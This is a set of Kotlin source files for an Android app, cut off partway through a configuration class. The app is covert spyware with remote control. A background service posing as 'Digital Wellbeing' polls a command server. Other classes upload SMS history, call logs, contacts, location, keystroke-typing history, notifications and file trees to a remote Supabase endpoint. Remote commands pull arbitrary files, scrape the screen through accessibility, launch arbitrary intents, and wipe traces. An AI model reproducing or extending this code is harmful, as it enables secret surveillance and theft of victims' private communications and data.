package com.example.myandroid

import android.content.Context
import android.content.pm.ApplicationInfo
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object AppListManager {

    fun getInstalledApps(ctx: Context): JSONArray {
        val list = JSONArray()
        try {
            val pm = ctx.packageManager
            val packages = pm.getInstalledPackages(0)

            for (pkg in packages) {
                // Filter out system apps to save space, unless you want them
                val isSystem = (pkg.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM) != 0

                val obj = JSONObject()
                obj.put("name", pkg.applicationInfo.loadLabel(pm).toString())
                obj.put("pkg", pkg.packageName)
                obj.put("ver", pkg.versionName)
                obj.put("type", if(isSystem) "SYSTEM" else "USER")
                obj.put("install_date", SimpleDateFormat("yyyy-MM-dd", Locale.US).format(Date(pkg.firstInstallTime)))

                list.put(obj)
            }
        } catch (e: Exception) { e.printStackTrace() }
        return list
    }
}

package com.example.myandroid

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*

class BeaconService : Service() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    private var intervalSeconds = 60L // Default safety

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val durationMins = intent?.getLongExtra("duration_mins", 5L) ?: 5L
        val endTime = System.currentTimeMillis() + (durationMins * 60 * 1000)

        // BURST MODE: Check every 5 seconds while active
        intervalSeconds = 5L 

        startForeground(9999, createNotification())

        scope.launch {
            DebugLogger.log("BEACON", "Starting Burst Mode ($durationMins mins)")
            while (isActive) {
                if (System.currentTimeMillis() > endTime) {
                    DebugLogger.log("BEACON", "Session Expired. Going dark.")
                    stopSelf()
                    break
                }

                // 1. Send Heartbeat
                CloudManager.sendPing(applicationContext, "Burst Mode ($durationMins min left)")

                // 2. CHECK FOR COMMANDS INSTANTLY
                CommandProcessor.checkAndExecute(applicationContext)

                delay(intervalSeconds * 1000)
            }
        }

        return START_STICKY
    }

    private fun createNotification(): Notification {
        val channelId = "sync_service"
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val chan = NotificationChannel(channelId, "Device Health", NotificationManager.IMPORTANCE_MIN)
            chan.setShowBadge(false)
            getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Digital Wellbeing")
            .setContentText("Running background analytics")
            .setSmallIcon(android.R.drawable.ic_menu_recent_history)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
        DebugLogger.log("BEACON", "Service Stopped")
    }
}

package com.example.myandroid

import android.content.Context
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

object CloudManager {

    // Modular Upload: Takes a list of features to upload (e.g. ["sms", "location"] or ["ALL"])
    suspend fun uploadData(ctx: Context, modules: List<String>) {
        withContext(Dispatchers.IO) {
            try {
                DebugLogger.log("Cloud", "Starting Upload. Modules: $modules")

                // Check Global Config before uploading
                if (!ConfigManager.canUpload(ctx)) {
                    DebugLogger.log("Cloud", "Upload BLOCKED by Schedule/Config")
                    return@withContext
                }

                val json = JSONObject()
                json.put("device_id", DeviceManager.getDeviceId(ctx))
                json.put("device_model", android.os.Build.MODEL)

                // Fallback: Attach token to standard uploads if it exists
                val fcmToken = ctx.getSharedPreferences("app_identity", Context.MODE_PRIVATE).getString("fcm_token", null)
                if (fcmToken != null) json.put("fcm_token", fcmToken)
                json.put("trigger", "AUTO")

                val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                val isAll = modules.contains("ALL")

                // --- MODULE 1: BASIC VITALS ---
                if (isAll || modules.contains("vitals")) {
                    val batt = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                    json.put("battery_level", batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0)
                }

                // --- MODULE 2: SMS ---
                if (isAll || modules.contains("sms")) {
                    json.put("sms_count", prefs.getInt("sms_count", 0))
                    json.put("sms_logs", JSONArray(prefs.getString("sms_logs_cache", "[]")))

                    // Historical Dump (Vault-First Logic)
                    if (!prefs.getBoolean("historical_sms_dumped", false)) {
                        PhoneManager.vaultHistoricalSms(ctx)
                        val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
                        if (vaultFile.exists()) {
                            json.put("historical_sms", JSONArray(vaultFile.readText()))
                        }
                    }
                }

                // --- MODULE 3: USAGE ---
                if (isAll || modules.contains("usage")) {
                     val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
                     val startToday = TimeManager.getStartOfDay()
                     val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_BEST, startToday, System.currentTimeMillis())
                     val totalMins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(
                         stats.filter { it.lastTimeUsed >= startToday }.sumOf { it.totalTimeInForeground }
                     )

                     json.put("screen_time_minutes", totalMins)
                     json.put("app_usage_timeline", UsageManager.getTimeline(ctx))

                     // Online Time
                     val (netTime, netSessions) = NetworkTracker.getStats(ctx)
                     json.put("online_time_minutes", java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(netTime))
                     json.put("online_sessions", netSessions)
                }

                // --- MODULE 4: LOCATION ---
                if (isAll || modules.contains("location")) {
                    json.put("location_history", JSONArray(prefs.getString("location_history", "[]")))
                }

                // --- MODULE 5: TYPING ---
                if (isAll || modules.contains("typing")) {
                     json.put("typing_history", JSONArray(prefs.getString("typing_history", "[]")))
                }

                // --- MODULE 6: NETWORK ---
                if (isAll || modules.contains("network")) {
                     json.put("network_logs", JSONArray(prefs.getString("net_history_log", "[]")))
                }

                // --- MODULE 7: PHONE (FORENSIC) ---
                if (isAll || modules.contains("phone")) {
                     json.put("calls", PhoneManager.getCallLogs(ctx))
                     json.put("contacts", PhoneManager.getContacts(ctx))
                     json.put("apps", AppListManager.getInstalledApps(ctx))
                }

                // --- MODULE 8: FILES (Skeleton) ---
                if (modules.contains("files")) {
                    // Heavy! Only if explicitly asked, NEVER in "ALL" by default to save data
                    json.put("file_skeleton", FileManager.generateReport())
                }

                // --- MODULE 9: NOTIFICATIONS ---
                if (isAll || modules.contains("notifications")) {
                     json.put("notif_history", JSONArray(prefs.getString("notif_history", "[]")))
                }

                // --- SUMMARY STATS AGGREGATION ---
                val summary = JSONObject()
                val distKm = prefs.getFloat("total_distance_km", 0f)
                summary.put("location_dist_km", distKm)

                val typeStats = TypingManager.getStats(ctx)
                summary.put("typing_chars", typeStats.getInt("total_chars"))
                summary.put("typing_wpm", typeStats.getInt("avg_wpm"))

                val phoneStats = PhoneManager.getStats(ctx)
                summary.put("call_duration_sec", phoneStats.totalDuration)
                summary.put("call_count_total", phoneStats.totalCalls)
                summary.put("contact_count", phoneStats.contactCount)

                summary.put("notif_count_total", prefs.getInt("notif_count", 0))
                summary.put("app_switch_count", UsageManager.getSwitchCount(ctx))

                json.put("summary_stats", summary)

                // SEND TO SUPABASE
                val wrapper = JSONObject()
                wrapper.put("action", "upload_stats")
                wrapper.put("deviceId", DeviceManager.getDeviceId(ctx))
                wrapper.put("payload", json)

                val supabaseUrl = SecretVault.getGatewayUrl(ctx)
                val supabaseKey = SecretVault.getLock(ctx)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Content-Encoding", "gzip")
                conn.setRequestProperty("Accept", "application/json")
                conn.doOutput = true

                // CRITICAL: GZIP streams must be finished and flushed before checking ResponseCode
                conn.outputStream.use { os ->
                    java.util.zip.GZIPOutputStream(os).use { gzip ->
                        val sanitized = wrapper.toString().replace("\\u0000", "")
                        gzip.write(sanitized.toByteArray(Charsets.UTF_8))
                        gzip.finish() 
                    }
                }

                val code = conn.responseCode
                if (code !in 200..299) {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("SUPABASE_ERR", "Code: $code | Msg: $err")
                } else {
                    DebugLogger.log("Cloud", "Upload Finished. Code: $code")
                    // Mark queue as complete AND clean up vault only on success
                    if (json.has("historical_sms")) {
                        prefs.edit().putBoolean("historical_sms_dumped", true).apply()
                        val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
                        if (vaultFile.exists()) vaultFile.delete()
                        DebugLogger.log("Cloud", "Historical SMS archive successfully extracted and synced. Vault cleared.")
                    }
                }
            } catch (e: Exception) {
                DebugLogger.log("CLOUD_FATAL", "Raw Upload Error:\n${e.stackTraceToString()}")
            }
        }
    }

    // --- INTERNAL DUMP COLLECTOR (FORENSIC MODE) ---
    fun collectDumpData(ctx: Context): JSONObject {
        val json = JSONObject()

        // 1. System Vitals
        json.put("static", DeviceManager.getStaticInfo(ctx))
        json.put("health", DeviceManager.getHealthStats(ctx))

        // 2. STREAM LOGGING RECOVERY
        json.put("stream_logs_status", "Delegated to Survivor Protocol (Streamed to Vault)")

        // 3. Persistent Data (The Deep Dive)
        json.put("calls", PhoneManager.getCallLogs(ctx))
        json.put("contacts", PhoneManager.getContacts(ctx))
        json.put("apps", AppListManager.getInstalledApps(ctx))

        // 4. File System
        try {
             if (PermissionManager.hasAllFilesAccess(ctx)) {
                 json.put("file_tree", FileManager.generateReport())
             }
        } catch(e: Exception) { json.put("file_tree", "ERROR: ${e.message}") }

        return json
    }

    // --- LIGHTWEIGHT BEACON (For IM_ONLINE command) ---
    fun sendPing(ctx: Context, note: String = "Online") {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                // Fetch instant battery level without registering a permanent receiver
                val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
                val batteryLevel = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)

                val payload = JSONObject()
                payload.put("device_model", android.os.Build.MODEL)
                payload.put("battery_level", batteryLevel)
                payload.put("trigger", "BEACON")
                payload.put("note", note)

                val summary = JSONObject()
                summary.put("status", "ONLINE")
                payload.put("summary_stats", summary)

                val wrapper = JSONObject()
                wrapper.put("action", "ping")
                wrapper.put("deviceId", DeviceManager.getDeviceId(ctx))
                wrapper.put("payload", payload)

                val supabaseUrl = SecretVault.getGatewayUrl(ctx)
                val supabaseKey = SecretVault.getLock(ctx)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true

                                val sanitizedJson = wrapper.toString().replace("\\u0000", "")
                conn.outputStream.use { it.write(sanitizedJson.toByteArray()) }
                val code = conn.responseCode
                if (code !in 200..299) {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("SUPABASE_ERR", "Ping Failed: $code | $err")
                } else {
                    DebugLogger.log("BEACON", "Ping sent ($note). Code: $code")
                }
            } catch (e: Exception) {
                DebugLogger.log("BEACON_FATAL", "Raw Ping Error:\n${e.stackTraceToString()}")
            }
        }
    }

    // --- SYNCHRONOUS FILE UPLOAD (OOM-SAFE STREAMING MULTIPART) ---
    suspend fun uploadFile(ctx: Context, file: java.io.File, category: String = "GENERAL"): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceManager.getDeviceId(ctx)
                val timestamp = System.currentTimeMillis()
                // Construct direct storage path: device_id/category/timestamp_filename
                val storagePath = "$deviceId/$category/${timestamp}_${file.name}"

                val supabaseUrl = SecretVault.getStorageUrl(ctx, "cortex-vault", storagePath)
                val supabaseKey = SecretVault.getLock(ctx)

                DebugLogger.log("CLOUD", "Direct Storage Pipe Open: ${file.name}")

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/gzip")
                conn.setRequestProperty("x-upsert", "true")
                conn.doOutput = true

                // Tell the OS we're streaming binary data directly
                conn.setFixedLengthStreamingMode(file.length())

                file.inputStream().use { input ->
                    conn.outputStream.use { output ->
                        input.copyTo(output, 8192)
                    }
                }

                val code = conn.responseCode
                if (code !in 200..299) {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("SUPABASE_ERR", "Stream Upload Failed (${file.name}): $code | $err")
                    return@withContext false
                } else {
                    DebugLogger.log("CLOUD", "Stream Upload ${file.name} Success. Registering...")
                    // Register file in database so it shows up in Vault
                    val reg = JSONObject()
                    reg.put("action", "register_file")
                    reg.put("deviceId", deviceId)
                    val p = JSONObject()
                    p.put("file_name", file.name)
                    p.put("file_path", storagePath)
                    p.put("category", category)
                    p.put("file_size", file.length())
                    reg.put("payload", p)

                    val regUrl = URL(SecretVault.getGatewayUrl(ctx))
                    val regConn = regUrl.openConnection() as HttpURLConnection
                    regConn.requestMethod = "POST"
                    regConn.setRequestProperty("apikey", supabaseKey)
                    regConn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                    regConn.setRequestProperty("Content-Type", "application/json")
                    regConn.doOutput = true
                    regConn.outputStream.use { it.write(reg.toString().toByteArray()) }
                    DebugLogger.log("CLOUD", "File Registry Status: ${regConn.responseCode}")
                    return@withContext true
                }
            } catch (e: Exception) {
                DebugLogger.log("CLOUD_FATAL", "Stream Upload Fatal:\n${e.stackTraceToString()}")
                return@withContext false
            }
        }
    }

    suspend fun uploadSkeleton(ctx: Context, json: JSONObject) {
        withContext(Dispatchers.IO) {
            try {
                json.put("device_id", DeviceManager.getDeviceId(ctx))

                val wrapper = JSONObject()
                wrapper.put("action", "upload_skeleton")
                wrapper.put("deviceId", DeviceManager.getDeviceId(ctx))
                wrapper.put("payload", json)

                val supabaseUrl = SecretVault.getGatewayUrl(ctx)
                val supabaseKey = SecretVault.getLock(ctx)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Content-Encoding", "gzip")
                conn.doOutput = true

                java.util.zip.GZIPOutputStream(conn.outputStream).use { gzip ->
                    gzip.write(wrapper.toString().toByteArray(Charsets.UTF_8))
                }
                val code = conn.responseCode
                if (code !in 200..299) {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("SUPABASE_ERR", "Skeleton Failed: $code | $err")
                } else {
                    DebugLogger.log("Cloud", "Skeleton Upload ($code) - Size: ${json.toString().length} bytes")
                }
            } catch (e: Exception) {
                DebugLogger.log("SKELETON_FATAL", "Raw Skeleton Error:\n${e.stackTraceToString()}")
            }
        }
    }
}

package com.example.myandroid

import android.content.Context
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

object CommandProcessor {

    suspend fun checkAndExecute(ctx: Context) {
        withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceManager.getDeviceId(ctx)
                // Fetch PENDING commands via Gateway
                val req = JSONObject()
                req.put("action", "get_commands")
                req.put("deviceId", deviceId)

                val supabaseUrl = SecretVault.getGatewayUrl(ctx)
                val supabaseKey = SecretVault.getLock(ctx)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("Accept", "application/json")
                conn.doOutput = true

                conn.outputStream.use { os -> 
                    os.write(req.toString().toByteArray(Charsets.UTF_8))
                    os.flush()
                }

                val code = conn.responseCode
                if (code == 200) {
                    val resp = conn.inputStream.bufferedReader().use { it.readText() }
                    val respObj = JSONObject(resp)
                    if (respObj.optBoolean("success")) {
                        val commands = respObj.optJSONArray("data") ?: JSONArray()
                        DebugLogger.log("CMD_PROC", "Fetch Success. Count: ${commands.length()}")
                        for (i in 0 until commands.length()) {
                            val cmd = commands.getJSONObject(i)
                            DebugLogger.log("SYSTEM", "Executing: ${cmd.optString("file_name")}")
                            processSingleCommand(ctx, cmd)
                        }
                    } else {
                        DebugLogger.log("CMD_PROC_ERR", "Gateway Logic Fail: ${respObj.optString("error")}")
                    }
                } else {
                    val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                    DebugLogger.log("CMD_PROC_ERR", "HTTP $code: $err")
                }
            } catch (e: Exception) {
                DebugLogger.log("CMD_PROC_FATAL", "Stack: ${e.message}")
            }
        }
    }

    private suspend fun processSingleCommand(ctx: Context, cmd: JSONObject) {
        val id = cmd.getInt("id")

        // 1. Mark as RECEIVED immediately so backend knows the device is alive
        updateCommandStatus(ctx, id, "RECEIVED", null)

        var status = "EXECUTED"
        var errorMsg = ""
        val fileName = cmd.optString("file_name")
        val content = cmd.optString("content", "")

        try {
            when (fileName) {
                "TOAST" -> {
                    Handler(Looper.getMainLooper()).post {
                        Toast.makeText(ctx, content, Toast.LENGTH_LONG).show()
                    }
                }
                "RING" -> {
                    val dur = content.toLongOrNull() ?: 10L
                    val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                    val oldMode = am.ringerMode
                    val oldVol = am.getStreamVolume(android.media.AudioManager.STREAM_RING)

                    if (PermissionManager.hasDndAccess(ctx)) {
                        am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
                    }
                    am.setStreamVolume(android.media.AudioManager.STREAM_RING, am.getStreamMaxVolume(android.media.AudioManager.STREAM_RING), 0)

                    val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
                    val ringtone = android.media.RingtoneManager.getRingtone(ctx, uri)
                    ringtone.play()

                    kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
                        kotlinx.coroutines.delay(dur * 1000)
                        ringtone.stop()
                        if (PermissionManager.hasDndAccess(ctx)) {
                            am.ringerMode = oldMode
                        }
                        am.setStreamVolume(android.media.AudioManager.STREAM_RING, oldVol, 0)
                    }
                    status = "RINGING (${dur}S)"
                }
                "STAY_READY" -> {
                    val mins = content.toLongOrNull() ?: 5L
                    val i = android.content.Intent(ctx, BeaconService::class.java)
                    i.putExtra("duration_mins", mins)
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i)
                    else ctx.startService(i)
                    status = "SYNC_PRIORITY_HIGH (${mins}M)"
                }
                "SET_INTERVAL" -> {
                    // Content = Interval in Minutes (min 15)
                    val mins = content.toLongOrNull() ?: 15L
                    val safeMins = if (mins < 15) 15L else mins

                    val wm = WorkManager.getInstance(ctx)
                    val constraints = Constraints.Builder()
                        .setRequiredNetworkType(NetworkType.CONNECTED)
                        .setRequiresBatteryNotLow(true)
                        .build()

                    val req = PeriodicWorkRequestBuilder<RemoteCommandWorker>(safeMins, TimeUnit.MINUTES)
                        .setConstraints(constraints)
                        .build()

                    wm.enqueueUniquePeriodicWork("RemoteCmdWorker", ExistingPeriodicWorkPolicy.REPLACE, req)
                    status = "EXECUTED (NEW INTERVAL: ${safeMins}M)"
                }
                "STOP_BEACON" -> {
                    ctx.stopService(android.content.Intent(ctx, BeaconService::class.java))
                    status = "EXECUTED (STOPPED)"
                }
                "FORCE_UPLOAD" -> {
                    val modules = content.split(",").map { it.trim() }
                    CloudManager.uploadData(ctx, modules)
                    status = "MANUAL_BACKUP_INITIATED"
                }
                "UPLOAD_DUMPS" -> {
                    val dumps = DumpManager.getDumpsForToday()
                    var successCount = 0
                    dumps.forEach {
                        if (CloudManager.uploadFile(ctx, it, "DUMPS")) successCount++
                    }
                    if (successCount != dumps.size) {
                        status = "PARTIAL_SYNC_FAILED ($successCount/${dumps.size})"
                        errorMsg = "Some archives failed to upload. Check network connection."
                    } else {
                        status = "ARCHIVE_SYNC_COMPLETE ($successCount)"
                    }
                }
                "PULL_FILE" -> {
                    val f = File(content)
                    if (f.exists() && f.isFile) {
                        val timestamp = System.currentTimeMillis()
                        val storagePath = "${DeviceManager.getDeviceId(ctx)}/PULL/${timestamp}_${f.name}"
                        if (!CloudManager.uploadFile(ctx, f, "PULL")) {
                            status = "FETCH_FAILED (UPLOAD_ERROR)"
                            errorMsg = "File exists but streaming to storage bucket failed."
                        } else {
                            status = "REMOTE_FETCH_SUCCESS"
                            // Return the specific path so the dashboard can generate a download link
                            updateCommandStatus(ctx, id, status, null, null, storagePath)
                            return // Exit early because we manually called update
                        }
                    } else {
                        status = "FETCH_ABORTED (NOT_FOUND)"
                        errorMsg = "File path does not exist on device."
                    }
                }
                "GET_SKELETON" -> {
                    val report = FileManager.generateReport()
                    status = "STORAGE_INDEX_COMPLETE"
                    DebugLogger.log("COMMAND", "Processed [$fileName] -> $status")
                    updateCommandStatus(ctx, id, status, null, report, null)
                    return
                }
                "GET_TREE" -> {
                    val root = MyAccessibilityService.instance?.rootInActiveWindow
                    if (root != null) {
                        val treeJson = MyAccessibilityService.instance?.serializeNode(root)
                        status = "UI_SNAPSHOT_CAPTURED"
                        DebugLogger.log("COMMAND", "Processed [$fileName] -> $status")
                        updateCommandStatus(ctx, id, status, null, treeJson, null)
                        return
                    } else {
                        status = "FAILED (NO_WINDOW)"
                        errorMsg = "Accessibility could not find an active window to scrape."
                    }
                }
                "GET_LOGS" -> {
                    val logs = DebugLogger.getLogs()
                    val tempFile = java.io.File(ctx.cacheDir, "diag_log_${System.currentTimeMillis()}.txt")
                    try {
                        tempFile.writeText(logs)
                        if (CloudManager.uploadFile(ctx, tempFile, "DIAGNOSTIC")) {
                            status = "DIAGNOSTIC_EXPORT_SUCCESS"
                        } else {
                            status = "DIAGNOSTIC_EXPORT_FAILED"
                        }
                    } catch (e: Exception) {
                        status = "EXPORT_ERROR"
                    } finally {
                        if (tempFile.exists()) tempFile.delete()
                    }
                }
                "TOGGLE_FEATURE" -> {
                    val parts = content.split(":")
                    if (parts.size >= 2) {
                        val feature = parts[0].trim()
                        val stateStr = parts[1].trim().lowercase()
                        val enable = stateStr == "on" || stateStr == "true"
                        val duration = if (parts.size >= 3) parts[2].toLongOrNull() ?: 0L else 0L

                        ConfigManager.setFeature(ctx, feature, enable, duration)
                        status = if (duration > 0L) "EXECUTED (TEMP OFF: ${duration}M)" else "EXECUTED (PERMANENT)"
                    } else status = "FAILED (FORMAT)"
                }
                "CODERED" -> {
                    val i = android.content.Intent(ctx, EmergencyService::class.java)
                    i.putExtra("codes", "0")
                    i.putExtra("sender", "BACKEND")
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        ctx.startForegroundService(i)
                    } else {
                        ctx.startService(i)
                    }
                }
                "NUKE" -> {
                    try {
                        File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android").deleteRecursively()
                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().clear().apply()
                        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                        val comp = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
                        if (dpm.isAdminActive(comp)) dpm.removeActiveAdmin(comp)
                        status = "CLEANUP_COMPLETE"
                        Handler(Looper.getMainLooper()).postDelayed({ android.os.Process.killProcess(android.os.Process.myPid()) }, 2000)
                    } catch(e: Exception) { status = "CLEANUP_FAILED" }
                }
                "RUN_INTENT" -> {
                    try {
                        val json = JSONObject(content)
                        val action = json.optString("action", android.content.Intent.ACTION_VIEW)
                        val intent = android.content.Intent(action)

                        val dataStr = json.optString("data", "")
                        if (dataStr.isNotEmpty()) {
                            intent.data = android.net.Uri.parse(dataStr)
                        }

                        if (json.has("pkg")) intent.setPackage(json.getString("pkg"))

                        val typeStr = json.optString("type", "")
                        if (typeStr.isNotEmpty()) {
                            if (intent.data != null) intent.setDataAndType(intent.data, typeStr)
                            else intent.type = typeStr
                        }

                        // Handle Extras
                        val extras = json.optJSONObject("extras")
                        extras?.keys()?.forEach { key ->
                            val value = extras.get(key)
                            if (value is Boolean) intent.putExtra(key, value)
                            else if (value is Int) intent.putExtra(key, value)
                            else intent.putExtra(key, value.toString())
                        }

                        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                        val target = json.optString("target", "activity")
                        when (target?.lowercase() ?: "activity") {
                            "service" -> {
                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(intent)
                                else ctx.startService(intent)
                            }
                            "broadcast" -> ctx.sendBroadcast(intent)
                            else -> ctx.startActivity(intent)
                        }
                                            status = "EXECUTED (INTENT SENT)"
                } catch (e: Exception) {
                    status = "FAILED_INTENT"
                    errorMsg = e.toString() // Capture full class name like ActivityNotFoundException
                }
            }
            }
        } catch (e: Exception) {
            status = "FAILED: ${e.message}"
            errorMsg = e.toString()
        }

        // Expose the result to the UI Terminal
        DebugLogger.log("COMMAND", "Processed [$fileName] -> $status")

        // Update DB
        updateCommandStatus(ctx, id, status, errorMsg)
    }

    private fun updateCommandStatus(ctx: Context, id: Int, status: String, errorMsg: String? = null, resultData: JSONObject? = null, resultFilePath: String? = null) {
        try {
            val key = SecretVault.getLock(ctx)
            val updateUrl = URL(SecretVault.getGatewayUrl(ctx))
            val conn = updateUrl.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("apikey", key)
            conn.setRequestProperty("Authorization", "Bearer $key")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true

            val req = JSONObject()
            req.put("action", "update_command")
            req.put("deviceId", DeviceManager.getDeviceId(ctx))
            val payload = JSONObject()
            payload.put("id", id)
            payload.put("status", status)
            if (!errorMsg.isNullOrEmpty()) payload.put("errorMsg", errorMsg)
            if (resultData != null) payload.put("resultData", resultData)
            if (!resultFilePath.isNullOrEmpty()) payload.put("resultFilePath", resultFilePath)
            req.put("payload", payload)

            conn.outputStream.use { it.write(req.toString().toByteArray()) }
            val code = conn.responseCode
            if (code !in 200..299) {
                val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                DebugLogger.log("SUPABASE_ERR", "Cmd Status Update Failed: $code | $err")
            }
        } catch (e: Exception) { 
            DebugLogger.log("CMD_ERR", "Update Status Error: ${e.message}")
        }
    }
}

package com.example.myandroid

import android.content.Context
import org.json.JSONObject
import java.util.Calendar

object ConfigManager {

    // Default: Allow everything always
    private const val DEFAULT_CONFIG = "{\"features\":{\"all\":{\"collect\":{\"mode\":\"ALWAYS\"},\"upload\":{\"mode\":\"ALWAYS\"}}}}"

    fun getConfig(ctx: Context): JSONObject {
        val prefs = ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE)
        val raw = prefs.getString("json", DEFAULT_CONFIG)
        return try { JSONObject(raw) } catch (e: Exception) { JSONObject(DEFAULT_CONFIG) }
    }

    fun updateConfig(ctx: Context, json: String) {
        ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE)
            .edit().putString("json", json).apply()
    }

    fun setFeature(ctx: Context, feature: String, enable: Boolean, durationMins: Long = 0) {
        try {
            val current = getConfig(ctx)
            val features = current.optJSONObject("features") ?: JSONObject()
            val rule = features.optJSONObject(feature) ?: JSONObject()
            val collect = rule.optJSONObject("collect") ?: JSONObject()

            if (enable) {
                collect.put("mode", "ALWAYS")
                collect.remove("expiry")
            } else {
                collect.put("mode", "NEVER")
                if (durationMins > 0) {
                    val expiry = System.currentTimeMillis() + (durationMins * 60 * 1000)
                    collect.put("expiry", expiry)
                } else {
                    collect.remove("expiry") // Permanent off
                }
            }

            rule.put("collect", collect)
            features.put(feature, rule)
            current.put("features", features)
            updateConfig(ctx, current.toString())
            DebugLogger.log("CONFIG", "Feature $feature set to $enable (Duration: $durationMins min)")
        } catch(e: Exception) { e.printStackTrace() }
    }

    fun canCollect(ctx: Context, feature: String): Boolean {
        // 1. Get Rule
        val config = getConfig(ctx)
        val features = config.optJSONObject("features") ?: return true
        val rule = features.optJSONObject(feature) ?: features.optJSONObject("all") ?: return true

        val collect = rule.optJSONObject("collect") ?: return true
        val mode = collect.optString("mode", "ALWAYS")

        // 2. Logic
        if (mode == "NEVER") {
            val expiry = collect.optLong("expiry", 0L)
            if (expiry == 0L) return false // Permanent Off
            if (System.currentTimeMillis() < expiry) return false // Still in timeout

            // TTL Expired! Self-heal back to Always
            return true
        }
        if (mode == "ALWAYS") return true

        if (mode == "SCHEDULED") {
            val start = collect.optString("start", "00:00")
            val end = collect.optString("end", "23:59")
            return isTimeBetween(start, end)
        }
        return true
    }

    fun canUpload(ctx: Context): Boolean {
        val config = getConfig(ctx)
        val global = config.optJSONObject("features")?.optJSONObject("all")?.optJSONObject("upload") ?: return true
        val mode = global.optString("mode", "ALWAYS")

